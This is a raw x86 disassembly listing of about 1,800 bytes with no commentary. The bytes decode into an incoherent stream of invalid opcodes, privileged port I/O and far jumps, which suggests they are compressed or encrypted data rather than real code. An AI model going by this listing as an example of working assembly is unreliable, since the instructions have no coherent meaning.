  40ff5f:	mov    ds:0x3371e791,al
  40ff64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff65:	std    
  40ff66:	scas   al,BYTE PTR es:[edi]
  40ff67:	adc    DWORD PTR [eax-0x6f],edx
  40ff6a:	scas   al,BYTE PTR es:[edi]
  40ff6b:	or     al,0x11
  40ff6d:	data16 lahf 
  40ff6f:	push   cs
  40ff70:	lods   al,BYTE PTR ds:[esi]
  40ff71:	jne    0x40ff49
  40ff73:	imul   edx,DWORD PTR [eax-0x6b],0x54
  40ff77:	mov    ecx,0x6ddb3356
  40ff7c:	je     0x40ffe3
  40ff7e:	rcr    BYTE PTR [esi+0x3b5cefae],1
  40ff84:	add    ebp,DWORD PTR [esi-0x78]
  40ff87:	lea    edx,[ebp+0x3a]
  40ff8a:	add    al,0x93
  40ff8c:	add    al,BYTE PTR [edx+ebx*2-0x2ad5811b]
  40ff93:	pop    ss
  40ff94:	and    DWORD PTR ds:0x95798e93,0xfffffff9
  40ff9b:	jp     0x40ffa1
  40ff9d:	popa   
  40ff9e:	add    edx,DWORD PTR [edi-0x547a780f]
  40ffa4:	sub    ah,cl
  40ffa6:	(bad)
  40ffa9:	inc    eax
  40ffaa:	inc    ebp
  40ffab:	dec    ebp
  40ffac:	inc    ecx
  40ffad:	aam    0xbb
  40ffaf:	cmp    DWORD PTR [edx-0x37b26bdc],0xd53118c3
  40ffb9:	mov    es,WORD PTR ds:0xc9bea52
  40ffbf:	out    dx,eax
  40ffc0:	ja     0x40ffff
  40ffc2:	jae    0x40ffbf
  40ffc4:	push   0xa57fdd98
  40ffc9:	into   
  40ffca:	call   0x185ba979
  40ffcf:	cli    
  40ffd0:	pop    esp
  40ffd1:	(bad)  
  40ffd2:	outs   dx,WORD PTR ds:[esi]
  40ffd4:	es pop ebp
  40ffd6:	push   0xffffffd3
  40ffd8:	mov    eax,ds:0x3dcf08c9
  40ffdd:	jns    0x410051
  40ffdf:	mov    ch,0x59
  40ffe1:	and    al,0x3f
  40ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe4:	loope  0x40fff9
  40ffe6:	mov    edx,0x36137c24
  40ffeb:	fstp   TBYTE PTR [ebp-0x6d95b888]
  40fff1:	mov    edx,0x3a921eef
  40fff6:	js     0x40ffcf
  40fff8:	add    edi,DWORD PTR [esi-0x25203b79]
  40fffe:	add    eax,0x1984e1f
  410003:	enter  0x84e8,0x70
  410007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410008:	aaa    
  410009:	add    ch,cl
  41000b:	xor    dl,BYTE PTR [edx+0x4d]
  41000e:	addr16 rcl dl,cl
  410011:	push   esp
  410012:	fld    DWORD PTR [edi+0xc6a41e5]
  410018:	mov    BYTE PTR [edi],ah
  41001a:	repz mov edx,0xe93dd993
  410020:	shl    BYTE PTR [ebx+0x71c9a756],cl
  410026:	pushf  
  410027:	push   esi
  410028:	sub    al,0x6c
  41002a:	lds    eax,FWORD PTR [eax-0x5b]
  41002d:	and    edi,0x1236c6a0
  410033:	and    DWORD PTR [ebx-0x451cb4d6],ebx
  410039:	jne    0x4100a0
  41003b:	popf   
  41003c:	jl     0x410059
  41003e:	mov    esi,0x9198093d
  410043:	iret   
  410044:	dec    esi
  410045:	dec    esp
  410046:	jbe    0x41009c
  410048:	jle    0x40ffd3
  41004a:	test   BYTE PTR [edx+0x13],dl
  41004d:	(bad)  
  41004f:	imul   ebx,DWORD PTR [edi-0x2e08ea6b],0x4883334d
  410059:	stc    
  41005a:	aad    0x94
  41005c:	aaa    
  41005d:	lods   al,BYTE PTR ds:[esi]
  41005e:	xor    eax,0x363ebee1
  410063:	and    BYTE PTR [edi+0x2f3323fe],bl
  410069:	xchg   ecx,eax
  41006a:	out    dx,eax
  41006b:	sub    al,BYTE PTR [edi]
  41006d:	inc    ecx
  41006e:	push   es
  41006f:	jae    0x4100db
  410071:	mov    dl,0xf2
  410073:	push   ebx
  410074:	sbb    BYTE PTR [ebx],al
  410076:	data16 loope 0x4100c1
  410079:	push   0x2f
  41007b:	pusha  
  41007c:	push   ebp
  41007d:	sub    cl,BYTE PTR [ebp+0x55]
  410080:	inc    edx
  410081:	adc    dh,BYTE PTR [esi+0x49]
  410084:	xor    DWORD PTR [eax-0x18],edi
  410087:	dec    edi
  410088:	jb     0x4100c7
  41008a:	adc    ebp,DWORD PTR [ecx]
  41008c:	sub    al,0xdb
  41008e:	mov    edx,0xc1204fed
  410093:	mov    ds:0xad100ff6,al
  410098:	dec    ecx
  410099:	mov    esi,0xb5e154c1
  41009e:	xor    dl,ah
  4100a0:	jle    0x410093
  4100a2:	fld    DWORD PTR [eax+0x4e4b8e5b]
  4100a8:	mov    edx,0x7896c526
  4100ad:	pop    esp
  4100ae:	loope  0x41009e
  4100b0:	cld    
  4100b1:	lea    edi,[esi+ebx*1+0x25]
  4100b5:	pop    es
  4100b6:	ins    BYTE PTR es:[edi],dx
  4100b7:	fadd   QWORD PTR [eax-0xd72c46d]
  4100bd:	cld    
  4100be:	out    dx,al
  4100bf:	jne    0x410044
  4100c1:	mov    ds,ebx
  4100c3:	into   
  4100c4:	sub    eax,0x1d2f9107
  4100c9:	jmp    0x8346:0xd3668994
  4100d0:	jl     0x4100e5
  4100d2:	repz add DWORD PTR [esp+ebp*2],eax
  4100d6:	inc    ebp
  4100d7:	lea    eax,[ecx-0x19]
  4100da:	dec    ebp
  4100db:	add    dl,al
  4100dd:	mov    edi,0x5e4846f5
  4100e2:	inc    eax
  4100e3:	inc    esp
  4100e4:	loop   0x41009b
  4100e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100e7:	mov    bh,BYTE PTR [eax+0x11]
  4100ea:	imul   esp,esp,0xf4962140
  4100f0:	pushf  
  4100f1:	mov    ds,WORD PTR [eax]
  4100f3:	retf   
  4100f4:	pop    esp
  4100f5:	mov    ds:0x40b7444f,al
  4100fa:	popa   
  4100fb:	add    dl,bh
  4100fd:	push   esp
  4100fe:	mov    ss,WORD PTR [esi+ebx*8-0x3]
  410102:	cdq    
  410103:	ss in  al,dx
  410105:	dec    edi
  410106:	test   BYTE PTR [eax+0x70],bh
  410109:	inc    edx
  41010a:	mov    ecx,0xc486bd14
  41010f:	mov    dl,0x26
  410111:	(bad)  
  410112:	outs   dx,DWORD PTR ds:[esi]
  410113:	pop    ds
  410114:	sbb    eax,0x7528ffce
  410119:	(bad)  
  41011b:	push   ebx
  41011c:	das    
  41011d:	mov    bh,0x8a
  41011f:	adc    cl,BYTE PTR [ebx-0x4f]
  410122:	mov    ecx,0xf4a8d476
  410127:	xchg   ebp,eax
  410128:	pop    esi
  410129:	pop    es
  41012a:	adc    DWORD PTR [ebp-0x5c],ebx
  41012d:	stc    
  41012e:	imul   edi,DWORD PTR [edx+0x7f14897a],0x13
  410135:	fnstsw WORD PTR [eax+0x78]
  410138:	jo     0x4101aa
  41013a:	mov    BYTE PTR ds:0xed2d8384,dl
  410140:	xor    ecx,eax
  410142:	test   al,0xa3
  410144:	(bad)  
  410145:	jo     0x410166
  410147:	xlat   BYTE PTR ds:[ebx]
  410148:	push   ss
  410149:	sub    DWORD PTR [ecx],0xffffffad
  41014c:	fdivr  QWORD PTR [ecx-0x63]
  41014f:	and    DWORD PTR [edx],eax
  410151:	jmp    0xf506:0xfff223aa
  410158:	pop    ds
  410159:	mov    DWORD PTR [ebp-0x61],esp
  41015c:	jne    0x4100fd
  41015e:	xor    cl,BYTE PTR [ebx+0x2e]
  410161:	adc    BYTE PTR [ecx+0x20],bl
  410164:	ret    0x1f23
  410167:	jecxz  0x410166
  410169:	sbb    ecx,DWORD PTR [esi+0x74]
  41016c:	mov    ch,0xb2
  41016e:	xchg   edi,eax
  41016f:	mov    eax,0xae673157
  410174:	gs ja  0x4101b8
  410177:	or     cl,cl
  410179:	(bad)  
  41017a:	(bad)  
  41017b:	in     al,dx
  41017c:	pop    esi
  41017d:	in     eax,0x70
  41017f:	retf   0x2c09
  410182:	xor    ebp,0xe73c07ba
  410188:	sbb    ebx,DWORD PTR [ebp-0xb6ec9d4]
  41018e:	dec    edi
  41018f:	pop    esp
  410190:	test   DWORD PTR [edi+eax*1+0x44ae3f26],eax
  410197:	scas   eax,DWORD PTR es:[edi]
  410198:	jmp    0x5870:0x8f5de01
  41019f:	jae    0x4101ad
  4101a1:	mov    dh,0x8c
  4101a3:	pusha  
  4101a4:	popf   
  4101a5:	cmp    bl,BYTE PTR [eax+0x7527edf]
  4101ab:	in     eax,dx
  4101ac:	pop    esi
  4101ad:	lods   eax,DWORD PTR ds:[esi]
  4101ae:	jecxz  0x410172
  4101b0:	scas   eax,DWORD PTR es:[edi]
  4101b1:	aad    0x6e
  4101b3:	jnp    0x410199
  4101b5:	(bad)  
  4101b6:	cmp    bl,al
  4101b8:	dec    esp
  4101b9:	adc    eax,0xa2e2565
  4101be:	mov    eax,ds:0x7860acad
  4101c3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4101c5:	leave  
  4101c6:	mov    bh,0xb0
  4101c8:	daa    
  4101c9:	ins    BYTE PTR es:[edi],dx
  4101ca:	and    bl,0xcc
  4101cd:	fcomp  QWORD PTR [esi]
  4101cf:	mov    dl,0x9c
  4101d1:	pop    ebx
  4101d2:	mov    ds:0x223b2f86,al
  4101d7:	(bad)  
  4101d8:	aaa    
  4101d9:	xchg   esi,eax
  4101da:	push   eax
  4101db:	(bad)  
  4101dc:	into   
  4101dd:	fsub   DWORD PTR [ebp+0x5916afa9]
  4101e3:	mov    esp,0xcede2830
  4101e8:	ret    
  4101e9:	pop    eax
  4101ea:	retf   
  4101eb:	jbe    0x410204
  4101ed:	sub    edi,ebx
  4101ef:	adc    BYTE PTR [ebp+0xf],al
  4101f2:	jns    0x4101bb
  4101f4:	pop    es
  4101f5:	add    bh,BYTE PTR [edx]
  4101f7:	push   ebx
  4101f8:	cs in  al,dx
  4101fa:	push   eax
  4101fb:	or     eax,0x8a5b9ddf
  410200:	mov    BYTE PTR [esi],0x50
  410203:	loop   0x410196
  410205:	jns    0x41022b
  410207:	push   ss
  410208:	mov    edx,0x785744bd
  41020d:	sub    ebx,DWORD PTR fs:[edx+0x7]
  410211:	xor    al,0xf3
  410213:	popa   
  410214:	xchg   edx,eax
  410215:	cdq    
  410216:	mov    bh,0x74
  410218:	or     BYTE PTR [eax+0x11d8c39f],dl
  41021e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021f:	cmp    al,0x9
  410221:	jmp    0xec438ed4
  410226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410227:	dec    edi
  410228:	rol    BYTE PTR ds:0x47eefb71,0x77
  41022f:	retf   
  410230:	int3   
  410231:	fdivr  st,st(0)
  410233:	lds    esp,FWORD PTR [eax+eiz*4-0x16622a64]
  41023a:	test   DWORD PTR [ebx],esp
  41023c:	lods   al,BYTE PTR ds:[esi]
  41023d:	mulps  xmm0,xmm0
  410240:	adc    al,0xc5
  410242:	int3   
  410243:	sbb    esi,DWORD PTR [eax+0x74a36e79]
  410249:	lea    esi,[edi+0x42234baa]
  41024f:	or     ecx,0x868d3f9f
  410255:	sbb    esi,esi
  410257:	push   es
  410258:	scas   eax,DWORD PTR es:[edi]
  410259:	mov    eax,0x772b7f7f
  41025e:	dec    esi
  41025f:	add    BYTE PTR [esi-0x65],dh
  410262:	fwait
  410263:	sbb    DWORD PTR [eax+0x5f2b5bd9],ebx
  410269:	mov    ebx,0xa4e00cf0
  41026e:	adc    edi,ebp
  410270:	jp     0x410252
  410272:	int3   
  410273:	outs   dx,DWORD PTR ds:[esi]
  410274:	adc    cl,bh
  410276:	inc    BYTE PTR [edx-0x6d]
  410279:	call   0x77cf:0x15e79c15
  410280:	pusha  
  410281:	sub    al,0xf
  410283:	(bad)  
  410284:	mov    ebx,0x29219daa
  410289:	dec    ebp
  41028a:	xor    al,0x85
  41028c:	and    eax,0xdc408122
  410291:	hlt    
  410292:	ficomp WORD PTR es:[ebp-0x43]
  410296:	shl    BYTE PTR [ebp-0x3066238c],1
  41029c:	call   0x830fa406
  4102a1:	daa    
  4102a2:	mov    cl,0xa0
  4102a4:	inc    ecx
  4102a5:	xor    DWORD PTR [esi],edi
  4102a7:	or     ah,BYTE PTR [ebx+esi*2]
  4102aa:	stos   BYTE PTR es:[edi],al
  4102ab:	stos   DWORD PTR es:[edi],eax
  4102ac:	pop    ss
  4102ad:	mov    ch,0xc6
  4102af:	and    dh,cl
  4102b1:	xor    eax,0xb007fe93
  4102b6:	pop    ds
  4102b7:	xchg   edi,eax
  4102b8:	cli    
  4102b9:	sub    DWORD PTR [ebx+0x9],edx
  4102bc:	jp     0x4102be
  4102be:	push   es
  4102bf:	mov    WORD PTR [eax-0x4490b56c],cs
  4102c5:	and    BYTE PTR [eax+edi*8],bl
  4102c8:	dec    ebp
  4102c9:	sub    ah,BYTE PTR [eax]
  4102cb:	mov    bh,0xea
  4102cd:	fwait
  4102ce:	sbb    ebp,DWORD PTR [eax]
  4102d0:	ja     0x410340
  4102d2:	(bad)  
  4102d3:	xor    edi,DWORD PTR [ebx]
  4102d5:	loope  0x4102d5
  4102d7:	or     DWORD PTR [esi-0x600bed99],esi
  4102dd:	and    dh,0x47
  4102e0:	cmp    esi,DWORD PTR [ecx-0x77]
  4102e3:	push   eax
  4102e4:	pop    es
  4102e5:	adc    al,0x31
  4102e7:	mov    edi,0x3f09de8a
  4102ec:	xchg   esp,eax
  4102ed:	push   cs
  4102ee:	icebp  
  4102ef:	fst    DWORD PTR [edi+0x26]
  4102f2:	sbb    al,0x30
  4102f4:	sbb    ah,BYTE PTR [eax+0xd629a2c]
  4102fa:	stos   DWORD PTR es:[edi],eax
  4102fb:	repz jg 0x41032a
  4102fe:	les    ecx,FWORD PTR [edi+0x3]
  410301:	outs   dx,DWORD PTR ds:[esi]
  410302:	or     BYTE PTR [esi],dl
  410304:	stos   DWORD PTR es:[edi],eax
  410305:	xchg   ebp,eax
  410306:	scas   al,BYTE PTR es:[edi]
  410307:	push   cs
  410308:	mov    al,0x14
  41030a:	loop   0x4102d1
  41030c:	and    BYTE PTR [eax],dl
  41030e:	sub    DWORD PTR [esi+0x2c3b5108],ebx
  410314:	pushf  
  410315:	fild   QWORD PTR [ecx-0x1e]
  410318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410319:	(bad)  
  41031a:	push   ebp
  41031b:	popa   
  41031c:	test   eax,0xaad57fee
  410321:	stos   DWORD PTR es:[edi],eax
  410322:	push   esi
  410323:	push   cs
  410324:	fwait
  410325:	scas   al,BYTE PTR es:[edi]
  410326:	push   esi
  410327:	mov    ch,0xe6
  410329:	jge    0x410380
  41032b:	lock push ebx
  41032d:	js     0x4102e6
  41032f:	dec    edx
  410330:	iret   
  410331:	xor    al,0x3a
  410333:	xor    al,BYTE PTR [ecx]
  410335:	enter  0xd675,0x1e
  410339:	sti    
  41033a:	sbb    bh,BYTE PTR [esi-0x2f5f142b]
  410340:	enter  0x3981,0x47
  410344:	inc    eax
  410345:	sbb    al,0x36
  410347:	adc    eax,0x4026e8c3
  41034c:	jae    0x410356
  41034e:	iret   
  41034f:	adc    DWORD PTR [ecx+0x7],0xa5ae51a2
  410356:	mov    cl,0xde
  410358:	or     ch,BYTE PTR [eax+0x79441cd6]
  41035e:	inc    edi
  41035f:	scas   eax,DWORD PTR es:[edi]
  410360:	popa   
  410361:	xchg   DWORD PTR [edx],esp
  410363:	xchg   ebx,eax
  410364:	sbb    al,0x48
  410366:	and    esp,ecx
  410368:	(bad)  
  410369:	xchg   ebx,eax
  41036a:	retf   0x53b3
  41036d:	jecxz  0x4103d5
  41036f:	or     DWORD PTR ds:0x813d278,ecx
  410375:	sub    al,0xcd
  410377:	das    
  410378:	nop
  410379:	fmul   st(7),st
  41037b:	pusha  
  41037c:	dec    esp
  41037d:	dec    ebp
  41037e:	pop    ds
  41037f:	jb     0x41038b
  410381:	ficomp DWORD PTR [ebx-0x1dbbd8da]
  410387:	sbb    esp,ebp
  410389:	(bad)  [edx-0x1dc78ca9]
  41038f:	push   eax
  410390:	add    BYTE PTR [eax-0x39],al
  410393:	dec    edx
  410394:	or     BYTE PTR [edx+esi*4-0x3b],cl
  410398:	mov    dl,0x36
  41039a:	sub    dh,bh
  41039c:	jbe    0x41039e
  41039e:	pop    edx
  41039f:	or     al,0xd1
  4103a1:	jnp    0x4103c5
  4103a3:	in     eax,dx
  4103a4:	call   ecx
  4103a6:	bound  edi,QWORD PTR [ecx+0x42]
  4103a9:	sbb    dh,BYTE PTR [eax+0x68e5acf8]
  4103af:	inc    edx
  4103b0:	cmp    cl,bh
  4103b2:	sub    esi,DWORD PTR [esp+esi*1-0x4f367034]
  4103b9:	mov    esi,0x9991f7b1
  4103be:	jae    0x41042b
  4103c0:	pop    ds
  4103c1:	les    esp,FWORD PTR [ebp-0x12]
  4103c4:	sub    al,0xd1
  4103c6:	and    al,0xf
  4103c8:	in     al,dx
  4103c9:	inc    edx
  4103ca:	and    edx,0x3
  4103cd:	jecxz  0x410434
  4103cf:	mov    ecx,0xb847dcb8
  4103d4:	pop    edi
  4103d5:	out    dx,al
  4103d6:	ret    
  4103d7:	mov    eax,ds:0x2e431600
  4103dc:	rol    BYTE PTR [ebx+edx*8-0x1],0x82
  4103e1:	in     eax,0x87
  4103e3:	xchg   esp,eax
  4103e4:	pop    eax
  4103e5:	imul   esp,esp,0x955c64b2
  4103eb:	mov    bl,0xd3
  4103ed:	aaa    
  4103ee:	fidiv  WORD PTR [edi-0x3aa6b43b]
  4103f4:	enter  0xd3d0,0x16
  4103f8:	jg     0x4103ac
  4103fa:	arpl   WORD PTR [ecx+0x3a],dx
  4103fd:	mov    eax,0xa48ddd27
  410402:	fucomp st(4)
  410404:	aam    0x3a
  410406:	mov    edx,0xc403f380
  41040b:	aas    
  41040c:	shl    BYTE PTR [ebp-0x73e841e7],cl
  410412:	or     edi,DWORD PTR [edx-0x70]
  410415:	jge    0x410471
  410417:	mov    al,ds:0x40c33773
  41041c:	cmc    
  41041d:	mov    WORD PTR [ecx-0x5b62510b],?
  410423:	jle    0x410488
  410425:	ins    BYTE PTR es:[edi],dx
  410426:	fcomp  DWORD PTR [edi+eiz*4+0x2]
  41042a:	push   0x39d8f44
  41042f:	mov    al,ds:0xc2b35d18
  410434:	adc    esp,esi
  410436:	xchg   edx,eax
  410437:	out    0x81,al
  410439:	fwait
  41043a:	stc    
  41043b:	xchg   esp,eax
  41043c:	adc    eax,0xe42a8b
  410441:	pop    ds
  410442:	(bad)
  410447:	mov    bl,0xfc
  410449:	pop    ebx
  41044a:	mov    esi,0x18ce6c99
  41044f:	sbb    ah,BYTE PTR [esp+ecx*8]
  410452:	addr16 int 0xc7
  410455:	js     0x4104a6
  410457:	jecxz  0x410407
  410459:	jo     0x410493
  41045b:	inc    edx
  41045c:	(bad)  
  41045d:	jae    0x4103f7
  41045f:	arpl   WORD PTR [edi],bp
  410461:	test   DWORD PTR [esi+ebp*8],ebp
  410464:	icebp  
  410465:	or     ebp,DWORD PTR [ebx-0x7f9b3ea5]
  41046b:	adc    al,0xd7
  41046d:	mov    eax,0x102706a8
  410472:	das    
  410473:	dec    esi
  410474:	pop    ebp
  410475:	xchg   cl,ah
  410477:	into   
  410478:	je     0x4104ca
  41047a:	sub    BYTE PTR [ebx-0x6c],bh
  41047d:	push   0x8f573591
  410482:	test   BYTE PTR [edi+esi*1],al
  410485:	hlt    
  410486:	iret   
  410487:	cmp    ecx,edx
  410489:	sub    al,0xc4
  41048b:	pop    esi
  41048c:	mov    bh,BYTE PTR [ebx-0x112c40d8]
  410492:	mov    ch,0xec
  410494:	xor    eax,0x88860a79
  410499:	nop
  41049a:	jge    0x4104d1
  41049c:	mov    ebp,0xefecc2cb
  4104a1:	and    bl,BYTE PTR [ecx]
  4104a3:	in     eax,0x1e
  4104a5:	or     dh,cl
  4104a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a8:	push   ebx
  4104a9:	dec    esp
  4104aa:	loop   0x410457
  4104ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104ad:	inc    eax
  4104ae:	into   
  4104af:	cld    
  4104b0:	xchg   ebp,eax
  4104b1:	dec    ebx
  4104b2:	les    ecx,FWORD PTR [eax]
  4104b4:	cdq    
  4104b5:	mov    ch,0xe0
  4104b7:	mov    ch,0xa8
  4104b9:	loop   0x4104d7
  4104bb:	adc    BYTE PTR [esi+ecx*8],cl
  4104be:	and    DWORD PTR [ebx+0x7],ecx
  4104c1:	dec    esi
  4104c2:	dec    sp
  4104c4:	push   eax
  4104c5:	and    DWORD PTR [ebx],eax
  4104c7:	jno    0x410486
  4104c9:	(bad)  
  4104ca:	push   0x74b03d01
  4104cf:	or     DWORD PTR [esi],0xffffff95
  4104d2:	in     eax,0x6e
  4104d4:	jae    0x4104f5
  4104d6:	mov    ch,0x87
  4104d8:	push   ebp
  4104d9:	pop    ecx
  4104da:	mov    DWORD PTR [ecx-0x7d5d1d30],edi
  4104e0:	outs   dx,DWORD PTR ds:[esi]
  4104e1:	cs pop edx
  4104e3:	clc    
  4104e4:	imul   ebp,DWORD PTR [eax],0x5d
  4104e7:	jb     0x4104fe
  4104e9:	or     BYTE PTR [edi+0x51ac8a9c],cl
  4104ef:	sub    eax,DWORD PTR [ebp-0x5fcb04d0]
  4104f5:	lods   eax,DWORD PTR ds:[esi]
  4104f6:	es stos BYTE PTR es:[edi],al
  4104f8:	loope  0x4104f4
  4104fa:	cmp    al,0x42
  4104fc:	js     0x4104ce
  4104fe:	mov    bh,0x69
  410500:	add    DWORD PTR [eax-0x3ee3e8b5],esi
  410506:	es repz and dh,cl
  41050a:	mov    al,0x7a
  41050c:	dec    ecx
  41050d:	jnp    0x41058c
  41050f:	nop
  410510:	inc    edx
  410511:	mov    ecx,0x2869cc74
  410516:	or     DWORD PTR [edx+0x1c],ebp
  410519:	ss fst st(1)
  41051c:	pop    esp
  41051d:	jne    0x4104b9
  41051f:	xor    DWORD PTR [ebx+0x42],ecx
  410522:	iret   
  410523:	mov    edi,0xcac412b2
  410528:	pop    ss
  410529:	mov    al,0xe8
  41052b:	stos   DWORD PTR es:[edi],eax
  41052c:	in     eax,0xf1
  41052e:	iret   
  41052f:	ds push ecx
  410531:	es fst st(5)
  410534:	hlt    
  410535:	push   esp
  410536:	nop
  410537:	(bad)  
  410538:	call   0x6a9c:0xc8fb4097
  41053f:	mov    cl,0x89
  410541:	jo     0x410506
  410543:	mov    ebx,0xf59b204c
  410548:	jmp    0x45988984
  41054d:	push   esi
  41054e:	mov    DWORD PTR [ebp-0x47],eax
  410551:	xchg   esp,eax
  410552:	call   0xe76d:0x7791f23
  410559:	lea    esi,[ecx]
  41055b:	nop
  41055c:	mov    esp,eax
  41055e:	int3   
  41055f:	sti    
  410560:	xor    cl,BYTE PTR [edi-0xd]
  410563:	lds    ebp,FWORD PTR ds:0xdd4ce129
  410569:	cmp    BYTE PTR [ebx],bl
  41056b:	imul   edx,DWORD PTR [ebx+0x4d3c499f],0x4c
  410572:	xchg   ecx,eax
  410573:	pop    eax
  410574:	push   es
  410575:	mov    al,ds:0x2e315b3b
  41057a:	aam    0xde
  41057c:	push   0x8066696d
  410581:	es cli 
  410583:	repnz mov dh,0x7c
  410586:	inc    ebx
  410587:	cdq    
  410588:	and    eax,0x28a92eed
  41058d:	push   ss
  41058e:	mov    ebp,0x7759b136
  410593:	fld    QWORD PTR [eax+0x5285c92b]
  410599:	push   0xffffffc1
  41059b:	and    eax,0xda257af4
  4105a0:	and    al,0x19
  4105a2:	call   0x6ce1:0xb8348e1f
  4105a9:	and    BYTE PTR fs:[ebx*2+0x20cd217],ah
  4105b1:	jb     0x4105b9
  4105b3:	rol    BYTE PTR [ecx+ebx*4-0x2094304c],cl
  4105ba:	jge    0x410635
  4105bc:	xchg   esi,eax
  4105bd:	into   
  4105be:	(bad)  
  4105c0:	gs in  al,0x52
  4105c3:	arpl   WORD PTR [esi-0x1694e766],si
  4105c9:	push   cs
  4105ca:	(bad)  
  4105cb:	and    bl,BYTE PTR ds:0x4a1d7b91
  4105d1:	jecxz  0x410641
  4105d3:	mov    ebp,DWORD PTR [ebp-0x3a]
  4105d6:	adc    BYTE PTR [esi+0x7b],cl
  4105d9:	out    0xd2,al
  4105db:	fcomp  DWORD PTR [esi]
  4105dd:	push   ss
  4105de:	jg     0x410614
  4105e0:	pop    ss
  4105e1:	aaa    
  4105e2:	ror    BYTE PTR [edx],1
  4105e4:	or     ecx,ebp
  4105e6:	hlt    
  4105e7:	dec    ecx
  4105e8:	aam    0x8f
  4105ea:	mov    esi,es
  4105ec:	sub    dh,BYTE PTR [ebx]
  4105ee:	or     al,0x29
  4105f0:	lahf   
  4105f1:	into   
  4105f2:	ret    
  4105f3:	add    eax,0x7347aad6
  4105f8:	mov    ebx,0xb39191f2
  4105fd:	xor    bl,BYTE PTR [ebp+0x55]
  410600:	stos   DWORD PTR es:[edi],eax
  410601:	jae    0x4105da
  410603:	dec    eax
  410604:	push   ds
  410605:	jmp    0xdbd77a71
  41060a:	pop    esi
  41060b:	fdiv   DWORD PTR [edi]
  41060d:	cmp    DWORD PTR [ebx-0x7df3fdee],esp
  410613:	or     eax,0x1ae20c3f
  410618:	pop    edi
  410619:	xor    DWORD PTR [ecx-0x5],edx
  41061c:	xor    cl,BYTE PTR [ebx]
  41061e:	fwait
  41061f:	(bad)  
  410620:	jp     0x41067d
  410622:	push   cs
  410623:	loope  0x410689
  410625:	mov    al,0x23
  410627:	sar    BYTE PTR [ebp+0x5ac6ce8],1
  41062d:	mov    cl,0x16
  41062f:	call   0x6c643012
  410634:	push   esp
  410635:	imul   esp,DWORD PTR [eax-0x568ddb65],0x29178701
  41063f:	sub    bh,ch
  410641:	fidiv  WORD PTR [ebp+0x3f]
  410644:	inc    eax
  410645:	pop    edi
  410646:	in     al,dx
  410647:	fs mov esi,0x59955ee0
  41064d:	les    ebp,FWORD PTR ds:0x476a3f54
  410653:	out    dx,al
  410654:	fcmovnb st,st(7)
  410656:	sbb    al,0x2
  410658:	in     al,0xa3
  41065a:	mov    edx,0xf16285e2
  41065f:	test   BYTE PTR [eax+0x781f9e4a],bh
  410665:	arpl   WORD PTR [ecx+eax*8],bx
  410668:	bound  ebx,QWORD PTR [edi-0x24]
  41066b:	cs jl  0x410623
  41066e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41066f:	inc    edi
  410670:	mov    ecx,0x7931dd71
  410675:	mov    esi,0xe8bca1ea
  41067a:	aas    
  41067b:	ret    0x45ec
  41067e:	inc    edi
  41067f:	mov    BYTE PTR [esi+0x61522cc1],ah
  410685:	sbb    dh,BYTE PTR [edx]
  410687:	mov    ebp,0x81209f3e
  41068c:	dec    ecx
  41068d:	(bad)  
  41068e:	loopne 0x4106c9
  410690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410691:	sbb    BYTE PTR [edx],ch
  410693:	test   eax,0x5ce373b4
  410698:	aaa    
  410699:	test   eax,0xbdfe4241
  41069e:	mov    edi,0xa19a4fbd
  4106a3:	jb     0x41063e
  4106a5:	aas    
  4106a6:	ret    0xc6ea
  4106a9:	xchg   edx,eax
  4106aa:	jge    0x410651
  4106ac:	lock mov ebx,0xca48f0a6
  4106b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106b3:	push   es
  4106b4:	inc    esp
  4106b5:	je     0x4106b1
  4106b7:	mov    cl,0x2f
  4106b9:	inc    edx
  4106ba:	push   es
  4106bb:	mov    ds:0xd7441900,eax
  4106c0:	outs   dx,BYTE PTR ds:[esi]
  4106c1:	sbb    al,0x78
  4106c3:	ret    0x738
  4106c6:	ret    
  4106c7:	mov    ebp,0xd2ddb484
  4106cc:	and    al,0xb8
  4106ce:	out    dx,eax
  4106cf:	or     BYTE PTR [esi+ebx*8-0xb],0x7d
  4106d4:	div    BYTE PTR [esp+eax*2+0x4bb9fedd]
  4106db:	dec    esp
  4106dc:	lea    ebp,[ebx-0x75377f0f]
  4106e2:	outs   dx,DWORD PTR ds:[esi]
  4106e3:	outs   dx,BYTE PTR ds:[esi]
  4106e4:	or     al,0xe7
  4106e6:	(bad)  
  4106e8:	fistp  DWORD PTR [edi]
  4106ea:	fild   QWORD PTR [ebp+0x71]
  4106ed:	push   ebx
  4106ee:	jmp    0x41067c
  4106f0:	push   cs
  4106f1:	xchg   DWORD PTR [edx],ebx
  4106f3:	push   esp
  4106f4:	dec    esi
  4106f5:	mov    ebp,0x36ecc467
  4106fa:	fadd   DWORD PTR [ebx-0x670c493e]
  410700:	call   0x489b:0x9278aafb
  410707:	data16 (bad) 
  41070a:	jmp    0x2054:0xaebb576
  410711:	add    DWORD PTR [esi+eax*2],ecx
  410714:	xchg   edi,eax
  410715:	sbb    ebp,ebp
  410717:	add    BYTE PTR [ebx-0x2752aff4],dh
  41071d:	jnp    0x410750
  41071f:	push   0x49b503be
  410724:	push   eax
  410725:	stos   DWORD PTR es:[edi],eax
  410726:	stos   BYTE PTR es:[edi],al
  410727:	mov    cs,WORD PTR [ebx+0x4b]
  41072a:	(bad)  
  41072c:	and    al,0x9
  41072e:	add    cl,0x8f
  410731:	xchg   edx,eax
  410732:	inc    edi
  410733:	inc    edx
  410734:	fdivr  DWORD PTR [esi]
  410736:	dec    ecx
  410737:	(bad)  
  410738:	leave  
  410739:	or     al,0x71
  41073b:	test   edi,ecx
  41073d:	je     0x4107ae
  41073f:	sub    esp,DWORD PTR [esi-0x5ffb174b]
  410745:	fsin   
  410747:	out    0xea,al
  410749:	ins    DWORD PTR es:[edi],dx
  41074a:	sbb    ch,bh
